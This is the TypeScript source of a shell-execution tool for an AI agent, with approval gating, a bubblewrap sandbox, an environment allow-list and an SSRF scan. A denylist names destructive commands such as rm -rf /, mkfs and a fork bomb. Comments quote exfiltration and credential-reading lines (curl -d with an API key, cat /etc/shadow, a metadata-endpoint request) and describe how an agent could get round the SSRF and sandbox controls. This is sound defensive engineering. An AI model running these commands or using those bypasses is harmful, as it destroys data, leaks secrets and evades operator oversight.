// exec-dispatcher — native_exec(cmd) for the native agent (v1.2.62).
//
// Spawns a shell command, captures stdout/stderr, returns JSON. Always
// goes through the policy gate (NOT in default autoAllow), so the user
// sees an IM approval card per command per fingerprint.
//
// Sandbox:
//   AGIM_EXEC_SANDBOX=bwrap   (Linux only) wraps the command in
//                              bubblewrap with:
//                                --ro-bind /usr /usr
//                                --ro-bind /lib /lib
//                                --ro-bind /lib64 /lib64
//                                --ro-bind /etc/resolv.conf /etc/resolv.conf
//                                --proc /proc
//                                --dev /dev
//                                --bind <cwd> <cwd>     (writable workspace)
//                                --tmpfs /tmp
//                                --unshare-net? — kept ON (allows net so
//                                                 curl/git work)
//                                --die-with-parent
//                              i.e. process sees the host's read-only
//                              userland but cannot touch home dirs /
//                              ~/.agim/ / /root outside cwd. Pure UID
//                              isolation. No net isolation by default
//                              (operators who want it set
//                              AGIM_EXEC_SANDBOX_NET=off).
//   Default (v1.3.7, F2): when /usr/bin/bwrap exists the sandbox is ON
//                         automatically. The danger-pattern denylist is a
//                         tripwire, not a boundary — the real isolation is
//                         the bwrap namespace, so it must not be opt-in.
//   AGIM_EXEC_SANDBOX=off → plain spawn, no isolation (warns loudly when
//                            bwrap is installed but disabled).
//   When bwrap is NOT installed → plain spawn (no isolation available).
//
// Other env knobs:
//   AGIM_EXEC_TIMEOUT_MS    default 60_000, hard cap 600_000
//   AGIM_EXEC_MAX_OUTPUT    default 32_768 bytes per stream
//   AGIM_EXEC_ENV_PASS      comma-separated extra env keys to forward to
//                            the child (v1.3.7, F1 — default is a small
//                            safe allow-list, NOT the whole process.env)

import { spawn } from 'node:child_process'
import { existsSync, promises as fs } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, isAbsolute, join, relative, resolve as resolvePath, sep } from 'node:path'
import { AGIM_HOME } from '../agim-paths.js'
import { agimBgjobScript, bgjobAllowedPaths } from '../bgjob-install.js'
import { logger as rootLogger } from '../logger.js'
import type { ToolDef } from './provider-base.js'
import type { DispatcherResult, ToolDispatcher } from './tool-dispatcher.js'
import { canonicalizeToolName } from './tool-names.js'
import { isExecSandboxConfigured } from './execution-world.js'
import { checkUrlSafety } from './web-dispatcher.js'
import { checkToolUse } from '../self-protect.js'

const log = rootLogger.child({ component: 'exec-dispatcher' })

const DEFAULT_TIMEOUT_MS = 60_000
const HARD_TIMEOUT_CAP_MS = 600_000
const MIN_TIMEOUT_MS = 100  // F10 — floor so timeout_ms=1 can't self-DoS
const DEFAULT_MAX_OUTPUT = 32 * 1024

const EXEC_TOOL_NAMES = ['agim_exec'] as const
export function isExecToolName(name: string): boolean {
  return (EXEC_TOOL_NAMES as readonly string[]).includes(canonicalizeToolName(name))
}

export function getExecTools(): ToolDef[] {
  return [
    {
      name: 'agim_exec',
      description:
        'Execute a shell command in the agent\'s workspace. cwd defaults to the agent workspace; ' +
        'optional timeout_ms (default 60000, max 600000). Returns stdout, stderr, exit_code. ' +
        'Each invocation is approval-gated by default — the user sees an IM card with the command ' +
        'and must allow. When AGIM_EXEC_SANDBOX=bwrap (Linux), runs under bubblewrap so the ' +
        'command can\'t touch home dirs outside cwd.',
      parameters: {
        type: 'object',
        properties: {
          command: { type: 'string', description: 'Shell command. Will be invoked via /bin/sh -c.' },
          timeout_ms: { type: 'number', description: 'Per-call timeout in ms (default 60000, max 600000).' },
          cwd: {
            type: 'string',
            description:
              'Override cwd within the agent workspace (realpath-checked). Defaults to the agent workspace. ' +
              'Set AGIM_EXEC_ALLOW_ANY_CWD=1 to allow paths outside the workspace.',
          },
        },
        required: ['command'],
        additionalProperties: false,
      },
    },
  ]
}

export interface ExecContext {
  cwd: string
  /** v1.2.97 — when present, every spawned child gets AGIM_RPC_SOCKET
   *  and AGIM_RPC_TOKEN env vars so a bgjob-launched Python (or any
   *  language) script can call back into agim's tool surface via the
   *  local RPC server. The token is bound to this exact RunContext so
   *  a worker can only drive its own IM thread. Caller (native/index.ts)
   *  mints a token at turn start; exec-dispatcher injects it on every
   *  spawn under the same turn. Optional — leaving it unset just means
   *  the bgjob child can't call back (the existing v1.2.93 SOP still
   *  works, just without the RPC convenience). */
  rpcCtx?: { platform: string; channelId: string; threadId: string; userId: string }
}

export function buildExecDispatcher(ctx: ExecContext): ToolDispatcher {
  return async (call, signal): Promise<DispatcherResult> => {
    if (!isExecToolName(call.name)) {
      return { text: `not handled: ${call.name}`, isError: true, source: 'unknown' }
    }
    try {
      return await runExec(call.arguments, ctx, signal)
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      log.warn({ event: 'exec.tool.error', err: msg })
      return { text: `agim_exec failed: ${msg}`, isError: true, source: 'exec' }
    }
  }
}

async function runExec(args: Record<string, unknown>, ctx: ExecContext, signal: AbortSignal): Promise<DispatcherResult> {
  // Expand portable SOP prefixes (`"${AGIM_HOME:-$HOME/.agim}/scripts/bgjob"`)
  // to the resolved absolute wrapper BEFORE danger/meta/carve-out checks —
  // otherwise `$` trips SHELL_CHAIN_META and bwrap tears down detached workers.
  const command = rewriteBgjobCommand(
    typeof args.command === 'string'
      ? args.command
      : (typeof args.cmd === 'string' ? args.cmd : ''),
  )
  if (!command.trim()) return { text: 'command required', isError: true, source: 'exec' }

  // Self-protect (Layer 2): same patterns as Bash on the approval bus, so
  // native / Subagent HITL-skip cannot `agim_exec` the Agim service down.
  const selfGuard = checkToolUse('agim_exec', { command })
  if (selfGuard) {
    log.warn({
      event: 'exec.refused.self_protect',
      commandPreview: command.slice(0, 120),
    })
    return { text: selfGuard.message, isError: true, source: 'exec' }
  }

  // v1.2.66 — pre-flight: dangerous shell pattern denylist. These are
  // hard-blocked regardless of approval card / autoAllow — destructive
  // and unrecoverable. Operators with a legitimate need run them
  // directly on the host, not via the agent.
  const danger = checkDangerousCommand(command)
  if (danger) {
    log.warn({ event: 'exec.refused.dangerous_pattern', reason: danger, commandPreview: command.slice(0, 120) })
    return {
      text: `agim_exec refused: command matches a dangerous-pattern denylist (${danger}). If you legitimately need to run this, do it directly on the host — not via the agent. To override, the operator must edit src/core/llm/exec-dispatcher.ts:DANGEROUS_PATTERNS.`,
      isError: true,
      source: 'exec',
    }
  }

  // v1.2.66 — defense-in-depth: scan the command for embedded internal
  // URLs (e.g. `curl http://169.254.169.254/...`, `wget http://10.0.0.1/`).
  // Without this, a model that's been instructed "don't fetch internal
  // hosts" can bypass the web-tool SSRF block by piping through exec.
  // Honours AGIM_NATIVE_WEB_SSRF_WHITELIST (shared with web tools).
  const internalUrlReason = scanCommandForInternalUrl(command)
  if (internalUrlReason) {
    log.warn({ event: 'exec.refused.internal_url', reason: internalUrlReason, commandPreview: command.slice(0, 120) })
    return {
      text: `agim_exec refused: command contains a URL targeting a private/internal address (${internalUrlReason}). ` +
        `If this is intentional, set AGIM_NATIVE_WEB_SSRF_WHITELIST or AGIM_NATIVE_WEB_ALLOW_PRIVATE=1.`,
      isError: true,
      source: 'exec',
    }
  }

  const timeoutMs = clampTimeout(args.timeout_ms)
  const requestedCwd = typeof args.cwd === 'string' && args.cwd.length > 0 ? args.cwd : ctx.cwd
  const cwdResolved = await resolveExecCwd(requestedCwd, ctx.cwd)
  if (!cwdResolved.ok) {
    log.warn({
      event: 'exec.refused.cwd_outside_workspace',
      requested: requestedCwd,
      workspace: ctx.cwd,
      reason: cwdResolved.reason,
    })
    return {
      text: `agim_exec refused: ${cwdResolved.reason}`,
      isError: true,
      source: 'exec',
    }
  }
  const cwd = cwdResolved.cwd

  const sandboxMode = (process.env.AGIM_EXEC_SANDBOX || '').toLowerCase()
  const bwrapAvail = existsSync('/usr/bin/bwrap')
  // v1.3.7 (F2) — default-on: enable the sandbox whenever bwrap is present
  // unless the operator explicitly opts out with AGIM_EXEC_SANDBOX=off.
  // Previously this was opt-in (=== 'bwrap'), which left every default
  // deployment running native_exec unconfined despite bwrap being available.
  const sandboxConfigured = isExecSandboxConfigured()
  if (bwrapAvail && sandboxMode === 'off') warnSandboxDisabledOnce()
  const sandboxNetOff = (process.env.AGIM_EXEC_SANDBOX_NET || '').toLowerCase() === 'off'

  // v1.2.93 — sandbox carve-out for the bgjob long-task wrapper. bgjob
  // detaches its worker via setsid (Python `start_new_session=True`);
  // bwrap's pid/cgroup namespace tears down the whole tree the moment
  // exec returns, so `bgjob start` looks like it succeeded but the
  // worker dies a second later. We bypass the sandbox only when the
  // command is unambiguously invoking one of the known bgjob wrapper
  // paths. Plain `bgjob` (PATH lookup) is NOT carved out because we
  // can't distinguish an attacker-controlled shim of the same name.
  const isBgjob = sandboxConfigured && isBgjobInvocation(command)
  const useSandbox = sandboxConfigured && !isBgjob

  const { bin, argv } = useSandbox
    ? buildBwrapInvocation(command, cwd, sandboxNetOff)
    : { bin: '/bin/sh', argv: ['-c', command] }

  // v1.2.97 — mint a per-spawn RPC token + injection env. Bound to
  // the current IM thread so the child can ONLY drive that thread's
  // memo / push / skill surface, never anyone else's. Best-effort:
  // if minting fails (RPC server didn't start, no rpcCtx) the spawn
  // still runs — Python sidecar inside the child will just refuse
  // to construct a client (raises RuntimeError on missing env).
  let extraEnv: NodeJS.ProcessEnv | undefined
  if (ctx.rpcCtx) {
    // Always stamp origin thread so `bgjob start` can bind the job to this
    // chat / IM thread (pet slot + exit notify). RPC token is best-effort.
    extraEnv = {
      AGIM_ORIGIN_PLATFORM: ctx.rpcCtx.platform,
      AGIM_ORIGIN_CHANNEL_ID: ctx.rpcCtx.channelId,
      AGIM_ORIGIN_THREAD_ID: ctx.rpcCtx.threadId,
      AGIM_ORIGIN_USER_ID: ctx.rpcCtx.userId,
    }
    try {
      const { mintRpcToken, resolveSocketPath } = await import('./agim-rpc-server.js')
      const { token } = mintRpcToken(ctx.rpcCtx, 'native_exec')
      extraEnv.AGIM_RPC_SOCKET = resolveSocketPath()
      extraEnv.AGIM_RPC_TOKEN = token
    } catch (err) {
      log.debug({
        event: 'exec.rpc_mint_failed',
        err: err instanceof Error ? err.message : String(err),
      }, 'failed to mint RPC token; child will boot without AGIM_RPC_*')
    }
  }

  log.info({
    event: 'exec.spawn',
    bin,
    cwd,
    sandbox: useSandbox ? `bwrap${sandboxNetOff ? '+no-net' : ''}` : (isBgjob ? 'bypassed-for-bgjob' : 'none'),
    rpcTokenInjected: !!extraEnv,
    timeoutMs,
    commandPreview: command.slice(0, 120),
  })

  return await runChild(bin, argv, { cwd, timeoutMs, signal, extraEnv })
}

// v1.2.66 — danger pattern matching. Patterns intentionally err on the
// false-positive side: refusing a legitimate `rm -rf ./build` is a
// minor annoyance, but missing a `rm -rf /` is unrecoverable. Each
// pattern returns a human-readable reason so the model + user can
// understand the block.
interface DangerPattern { regex: RegExp; reason: string }
const DANGEROUS_PATTERNS: DangerPattern[] = [
  // rm -rf with paths that touch root / home root / ~. Allow narrow
  // forms like `rm -rf ./build` and `rm -rf subdir/`.
  { regex: /(?:^|[;&|`(])\s*rm\s+(?:-[a-zA-Z]*[rfRF][a-zA-Z]*\s+)+(?:\/(?:\s|$|\*)|~\/?(?:\s|$)|\.\.\/+|\/\*)/, reason: 'rm -rf against root / home / .. — destructive' },
  // Filesystem formatting / partition tools.
  { regex: /\b(mkfs(?:\.\w+)?|mke2fs|mkdosfs|mkntfs|wipefs|fdisk|parted|sfdisk|cfdisk|gdisk)\b/, reason: 'filesystem format / partition tool' },
  // Raw block-device writes.
  { regex: /\bdd\s+[^|;]*\bof=\/dev\/(sd[a-z][0-9]*|nvme[0-9]+n[0-9]+(p[0-9]+)?|mmcblk[0-9]+|vd[a-z][0-9]*|hd[a-z][0-9]*|loop[0-9]+)/, reason: 'dd to raw block device' },
  // Classic fork bomb (and minor variants).
  { regex: /:\s*\(\s*\)\s*\{[^}]*\|\s*:\s*&?\s*\}\s*;\s*:/, reason: 'fork bomb' },
  // Recursive chmod 777 / chown - root.
  { regex: /\b(chmod|chown)\s+-R\s+[^\s]*\s+\/(?:\s|$)/, reason: 'recursive chmod/chown on /' },
  // Permanent kernel writes.
  { regex: /\becho\s+.*>\s*\/proc\/sys\/kernel\/(panic|sysrq)/, reason: 'writing to /proc/sys/kernel/panic|sysrq' },
  // shutdown / reboot / halt commands.
  { regex: /\b(shutdown|reboot|halt|poweroff)\b(?!\s+--?(help|version))/, reason: 'shutdown / reboot / halt' },
  // Disable swap on /. (Rare; precaution.)
  { regex: /\bswapoff\s+-a\b/, reason: 'swapoff -a' },
  // Make a setuid root binary.
  { regex: /\bchmod\s+(?:[ug]\+s|4[0-7]{3})\b/, reason: 'setuid / setgid bit change' },
  // > /etc/passwd or > /etc/shadow.
  { regex: />\s*\/etc\/(passwd|shadow|sudoers)\b/, reason: 'writing to /etc/passwd|shadow|sudoers' },
]

function checkDangerousCommand(cmd: string): string | null {
  for (const p of DANGEROUS_PATTERNS) {
    if (p.regex.test(cmd)) return p.reason
  }
  return null
}

// v1.3.7 (F2) — one-shot loud warning when bwrap is installed but the
// operator has explicitly disabled the sandbox. Without this, "off" is a
// silent, dangerous downgrade of the only real exec boundary.
let _warnedSandboxOff = false
function warnSandboxDisabledOnce(): void {
  if (_warnedSandboxOff) return
  _warnedSandboxOff = true
  log.warn({ event: 'exec.sandbox.disabled_despite_bwrap' },
    'AGIM_EXEC_SANDBOX=off: bubblewrap is installed but the native_exec sandbox is disabled — commands run unconfined on the host')
}

// v1.3.7 (F1) — env allow-list. The child previously inherited the FULL
// process.env, so any native_exec command could read every secret the
// agent process holds (*_API_KEY, DB_PASSWORD, SSH_*, …) and exfil it
// straight past the SSRF guards (e.g. `curl -d "$OPENAI_API_KEY" url`).
// We now forward only a small safe base set, the per-spawn RPC injection
// (extraEnv), and any keys the operator opts into via AGIM_EXEC_ENV_PASS.
const SAFE_ENV_KEYS = [
  'PATH', 'HOME', 'LANG', 'LC_ALL', 'LC_CTYPE', 'USER', 'LOGNAME',
  'TMP', 'TMPDIR', 'TEMP', 'TERM', 'SHELL', 'TZ', 'PWD',
] as const

export function buildExecEnv(extraEnv?: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const passExtra = (process.env.AGIM_EXEC_ENV_PASS || '')
    .split(',').map((s) => s.trim()).filter(Boolean)
  const base: NodeJS.ProcessEnv = {}
  for (const k of [...SAFE_ENV_KEYS, ...passExtra]) {
    const v = process.env[k]
    if (v != null) base[k] = v
  }
  // Always stamp resolved AGIM_HOME so SOP portable paths expand to the
  // same tree where `agim start` installed scripts/bgjob — even when the
  // operator set a custom AGIM_HOME that is not on the safe allow-list.
  base.AGIM_HOME = process.env.AGIM_HOME?.trim() || AGIM_HOME
  return extraEnv ? { ...base, ...extraEnv } : base
}

/**
 * v1.2.93 / v1.2.99 — detect "this command is invoking the agim
 * long-task bgjob wrapper". When it is, the caller skips bwrap so the
 * wrapper's setsid-detached worker actually survives past exec return.
 *
 * Security model (tightened in v1.2.99 after CR finding A1):
 *   - We bypass bwrap for the **entire** shell command line. So a
 *     command like `bgjob status x && cat /etc/shadow > /tmp/leak`
 *     would let `cat` run on the host FS, totally outside sandbox.
 *   - To prevent that, this matcher now **only** returns true when
 *     the trimmed command IS a single bgjob invocation: it must start
 *     with one of the absolute wrapper paths, AND contain NO shell
 *     metacharacters that could chain extra commands (`;` `&` `|`
 *     `(` `)` `<` `>` `` ` `` `$`). Anything else falls through to
 *     sandbox.
 *   - Bare `bgjob` (PATH lookup) is still refused: an attacker-
 *     controlled shim of the same name in PATH must not inherit the
 *     bypass.
 *
 * Matched paths (absolute only, resolved at call time):
 *   - ~/.agim/scripts/bgjob                 (shipped default)
 *   - ~/.claude/scripts/bgjob               (legacy Claude Code)
 *   - ~/.config/opencode/scripts/bgjob      (legacy opencode)
 */

/** Shell metacharacters that could chain additional commands. We
 *  reject the whole bypass if any are present in the command, even
 *  when the bgjob wrapper itself sits at the start. */
const SHELL_CHAIN_META = /[;&|()<>`$]/

/**
 * Expand role-book portable bgjob prefixes to the absolute installed
 * wrapper path. Only rewrites when the (trimmed) command *starts* with
 * a known portable expression — never mid-line — so `$()` payloads in
 * args still fail the carve-out meta check after rewrite.
 */
export function rewriteBgjobCommand(cmd: string): string {
  const m = cmd.match(/^(\s*)([\s\S]*)$/)
  if (!m) return cmd
  const leading = m[1] ?? ''
  const rest = m[2] ?? ''
  if (!rest) return cmd
  const abs = agimBgjobScript(process.env.AGIM_HOME?.trim() || AGIM_HOME)
  // Keep in sync with AGIM_BGJOB_WRAPPER_EXPR in agent-cwd.ts
  const prefixes = [
    '"${AGIM_HOME:-$HOME/.agim}/scripts/bgjob"',
    "'${AGIM_HOME:-$HOME/.agim}/scripts/bgjob'",
    '${AGIM_HOME:-$HOME/.agim}/scripts/bgjob',
    '"$AGIM_HOME/scripts/bgjob"',
    "'$AGIM_HOME/scripts/bgjob'",
    '$AGIM_HOME/scripts/bgjob',
    '"$HOME/.agim/scripts/bgjob"',
    "'$HOME/.agim/scripts/bgjob'",
    '$HOME/.agim/scripts/bgjob',
  ]
  for (const prefix of prefixes) {
    if (rest === prefix || rest.startsWith(`${prefix} `) || rest.startsWith(`${prefix}\t`)) {
      return leading + abs + rest.slice(prefix.length)
    }
  }
  return cmd
}

export function isBgjobInvocation(cmd: string): boolean {
  // Expand portable SOP first so `$` in the taught wrapper expr does not
  // falsely trip SHELL_CHAIN_META.
  const trimmed = rewriteBgjobCommand(cmd).trim()
  // v1.2.99 — refuse if the command contains anything that could
  // tack on extra payload. Includes subshell `( ... )`, backticks,
  // `$( ... )` substitution, redirection, and obvious chaining.
  if (SHELL_CHAIN_META.test(trimmed)) return false
  for (const path of bgjobAllowedPaths()) {
    // Path must be at the START of the (trimmed) command, followed
    // by whitespace or EOL. No leading args / env-var assignments /
    // sudo are allowed before the bgjob path.
    const escaped = path.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
    const re = new RegExp(`^${escaped}(?:\\s|$)`)
    if (re.test(trimmed)) return true
  }
  return false
}

function scanCommandForInternalUrl(cmd: string): string | null {
  // Pull plausible URL tokens out of the command and feed each through
  // the web-dispatcher's checkUrlSafety. Stops at first private hit.
  const urlRe = /https?:\/\/[^\s"'`;|<>]+/gi
  for (const match of cmd.matchAll(urlRe)) {
    const url = match[0]
    const safe = checkUrlSafety(url)
    if (!safe.ok) return `${url} — ${safe.reason ?? 'private'}`
  }
  return null
}

/**
 * Resolve and confine exec cwd to the agent workspace.
 * Escape hatch: AGIM_EXEC_ALLOW_ANY_CWD=1 (operator-only).
 */
export async function resolveExecCwd(
  requested: string,
  workspaceRoot: string,
): Promise<{ ok: true; cwd: string } | { ok: false; reason: string }> {
  let raw = requested.trim()
  if (!raw) return { ok: false, reason: 'cwd must be a non-empty string' }
  if (raw === '~') raw = homedir()
  else if (raw.startsWith('~/')) raw = homedir() + raw.slice(1)
  const abs = isAbsolute(raw) ? resolvePath(raw) : resolvePath(workspaceRoot, raw)
  const allowAny = (process.env.AGIM_EXEC_ALLOW_ANY_CWD || '').trim() === '1'
  if (allowAny) {
    const realAny = await realpathSoft(abs)
    return { ok: true, cwd: realAny }
  }
  const realWs = await realpathSoft(workspaceRoot)
  const realCwd = await realpathSoft(abs)
  const rel = relative(realWs, realCwd)
  if (rel.startsWith('..') || (rel.length > 0 && isAbsolute(rel))) {
    return {
      ok: false,
      reason:
        `cwd "${realCwd}" is outside workspace "${realWs}". ` +
        'Pass a path inside the agent workspace, or set AGIM_EXEC_ALLOW_ANY_CWD=1.',
    }
  }
  return { ok: true, cwd: realCwd }
}

async function realpathSoft(abs: string): Promise<string> {
  try {
    return await fs.realpath(abs)
  } catch {
    const lastSep = abs.lastIndexOf(sep)
    if (lastSep <= 0) return abs
    const parent = abs.slice(0, lastSep)
    const name = abs.slice(lastSep + 1)
    try {
      const realParent = await fs.realpath(parent)
      return resolvePath(realParent, name)
    } catch {
      return abs
    }
  }
}

/** State dirs that must be tmpfs-masked inside bwrap (secrets / tokens). */
export function bwrapMaskedStateDirs(): string[] {
  const dirs = new Set<string>()
  const runtimeHome = (process.env.AGIM_HOME?.trim() || AGIM_HOME)
  dirs.add(resolvePath(runtimeHome))
  dirs.add(resolvePath(AGIM_HOME))
  dirs.add(resolvePath(join(homedir(), '.agim')))
  return [...dirs]
}

function buildBwrapInvocation(command: string, cwd: string, netOff: boolean): { bin: string; argv: string[] } {
  // v1.2.66 — tmpfs-mask the agim state dir + the cwd's parent before
  // binding cwd back. Without this, even though sensitive-paths.ts
  // blocks tool-arg paths to ~/.agim/, an exec'd shell command can
  // still `cat ~/.agim/env` because the FS is exposed transparently.
  // Mirrors nanobot's `--tmpfs <ws.parent>` pattern, adapted for
  // agim's path layout (`~/.agim` is a sibling of
  // `~/.agim-workspaces`, not a parent).
  //
  // Mask resolved AGIM_HOME (custom override) AND the legacy ~/.agim
  // path so secrets/tokens stay unreachable when operators relocate state.
  const cwdParent = dirname(cwd)
  const argv: string[] = [
    '--die-with-parent',
    '--new-session',
    '--unshare-pid',
    '--ro-bind', '/usr', '/usr',
    '--ro-bind-try', '/lib', '/lib',
    '--ro-bind-try', '/lib64', '/lib64',
    '--ro-bind-try', '/bin', '/bin',
    '--ro-bind-try', '/sbin', '/sbin',
    '--ro-bind-try', '/etc/resolv.conf', '/etc/resolv.conf',
    '--ro-bind-try', '/etc/ssl', '/etc/ssl',
    '--ro-bind-try', '/etc/ca-certificates', '/etc/ca-certificates',
    '--proc', '/proc',
    '--dev', '/dev',
    '--tmpfs', '/tmp',
  ]
  for (const stateDir of bwrapMaskedStateDirs()) {
    argv.push('--tmpfs', stateDir)
  }
  argv.push(
    // Mask the parent of the workspace cwd so the agent can't list
    // sibling threads' workspaces. cwdParent is typically
    // ~/.agim-workspaces/native/, and other threads live there.
    '--tmpfs', cwdParent,
    // Re-mount the actual cwd over the masked parent so the agent
    // still has its workspace. `--dir` recreates the path inside the
    // sandbox; `--bind` brings the host content back.
    '--dir', cwd,
    '--bind', cwd, cwd,
    '--chdir', cwd,
  )
  if (netOff) argv.push('--unshare-net')
  // v1.2.100 — use /usr/bin/sh instead of /bin/sh. On modern Debian /
  // Ubuntu (usrmerge: /bin is a symlink to usr/bin), bwrap's
  // `--ro-bind-try /bin /bin` does NOT follow the symlink, so the
  // sandbox ends up with /bin as an empty directory and `/bin/sh`
  // returns ENOENT — every native_exec command fails. /usr is bound
  // unconditionally on line 307 so /usr/bin/sh is always present.
  // On non-usrmerge systems both paths resolve to the same binary.
  argv.push('--', '/usr/bin/sh', '-c', command)
  return { bin: '/usr/bin/bwrap', argv }
}

interface RunOpts { cwd: string; timeoutMs: number; signal: AbortSignal; extraEnv?: NodeJS.ProcessEnv }

function runChild(bin: string, argv: string[], opts: RunOpts): Promise<DispatcherResult> {
  return new Promise<DispatcherResult>((resolve) => {
    const maxOutput = clampNumber(process.env.AGIM_EXEC_MAX_OUTPUT, DEFAULT_MAX_OUTPUT, 1024, 1024 * 1024)
    let stdout = ''
    let stderr = ''
    let stdoutTruncated = false
    let stderrTruncated = false
    let timedOut = false
    let spawnError: Error | null = null
    let settled = false

    const env = buildExecEnv(opts.extraEnv)  // v1.3.7 (F1) — allow-list, not full process.env
    const child = spawn(bin, argv, {
      cwd: opts.cwd,
      env,
      signal: opts.signal,
      // A shell command can spawn grandchildren (`sh -c "sleep 10"`). Put it
      // in its own process group so cancellation/timeout can settle the whole
      // operation before goal evidence is finalized.
      detached: process.platform !== 'win32',
    })
    const killTree = (signalName: NodeJS.Signals) => {
      try {
        if (process.platform !== 'win32' && child.pid) process.kill(-child.pid, signalName)
        else child.kill(signalName)
      } catch { /* process already gone */ }
    }
    let killTimer: ReturnType<typeof setTimeout> | undefined
    const armHardKill = () => {
      if (killTimer) return
      killTimer = setTimeout(() => {
        killTree('SIGKILL')
      }, 3_000)
      killTimer.unref()
    }
    const onAbort = () => {
      killTree('SIGTERM')
      armHardKill()
    }
    opts.signal.addEventListener('abort', onAbort, { once: true })
    const timer = setTimeout(() => {
      timedOut = true
      killTree('SIGTERM')
      // Hard SIGKILL after a 3s grace period so the dispatcher doesn't
      // hang on a process that ignores SIGTERM.
      armHardKill()
    }, opts.timeoutMs)
    timer.unref()

    child.stdout?.setEncoding('utf-8')
    child.stderr?.setEncoding('utf-8')
    child.stdout?.on('data', (chunk: string) => {
      if (stdout.length >= maxOutput) { stdoutTruncated = true; return }
      const room = maxOutput - stdout.length
      stdout += chunk.length > room ? chunk.slice(0, room) : chunk
      if (chunk.length > room) stdoutTruncated = true
    })
    child.stderr?.on('data', (chunk: string) => {
      if (stderr.length >= maxOutput) { stderrTruncated = true; return }
      const room = maxOutput - stderr.length
      stderr += chunk.length > room ? chunk.slice(0, room) : chunk
      if (chunk.length > room) stderrTruncated = true
    })
    child.on('close', (code, signalName) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      // The shell leader may exit while background descendants in its process
      // group remain alive. Reap that group before reporting settlement.
      if (process.platform !== 'win32') killTree('SIGKILL')
      if (killTimer) clearTimeout(killTimer)
      opts.signal.removeEventListener('abort', onAbort)
      const exitCode = code ?? -1
      const payload = {
        exit_code: exitCode,
        signal: signalName ?? null,
        timed_out: timedOut,
        stdout,
        stderr,
        stdout_truncated: stdoutTruncated,
        stderr_truncated: stderrTruncated,
      }
      // Treat non-zero as error so the model sees `isError: true` and
      // can react (e.g. retry with different args). Timed-out gets a
      // dedicated message at the top.
      const isError = timedOut || (exitCode !== 0 && exitCode !== null)
      const summary = timedOut
        ? `command timed out after ${opts.timeoutMs}ms; partial output below.\n`
        : spawnError
          ? `command aborted/failed: ${spawnError.message}\n`
        : ''
      resolve({
        text: summary + JSON.stringify(payload, null, 2),
        isError,
        source: 'exec',
      })
    })
    child.on('error', (err) => {
      spawnError = err
      // AbortSignal-driven child_process errors are followed by `close`.
      // Wait for close (and the SIGKILL fallback) so callers know the process
      // has actually settled before advancing the goal evidence epoch.
      if (opts.signal.aborted && child.pid) return
      if (settled) return
      settled = true
      clearTimeout(timer)
      if (killTimer) clearTimeout(killTimer)
      opts.signal.removeEventListener('abort', onAbort)
      resolve({
        text: `spawn failed: ${err.message}`,
        isError: true,
        source: 'exec',
      })
    })
  })
}

export function clampTimeout(raw: unknown): number {
  // v1.3.7 (F10) — floor at MIN_TIMEOUT_MS. Previously any n>0 was accepted,
  // so timeout_ms=1 would SIGTERM the child almost immediately (a self-DoS
  // the model could trip itself into). Clamp into [MIN, HARD_CAP].
  const fromArg = typeof raw === 'number' ? raw : Number(raw)
  if (Number.isFinite(fromArg) && fromArg > 0) {
    return clampMs(fromArg)
  }
  const env = process.env.AGIM_EXEC_TIMEOUT_MS
  if (env) {
    const n = Number(env)
    if (Number.isFinite(n) && n > 0) return clampMs(n)
  }
  return DEFAULT_TIMEOUT_MS
}

function clampMs(n: number): number {
  return Math.min(HARD_TIMEOUT_CAP_MS, Math.max(MIN_TIMEOUT_MS, Math.floor(n)))
}

function clampNumber(input: unknown, dflt: number, min: number, max: number): number {
  const n = typeof input === 'number' ? input : Number(input)
  if (!Number.isFinite(n)) return dflt
  return Math.max(min, Math.min(max, Math.floor(n)))
}
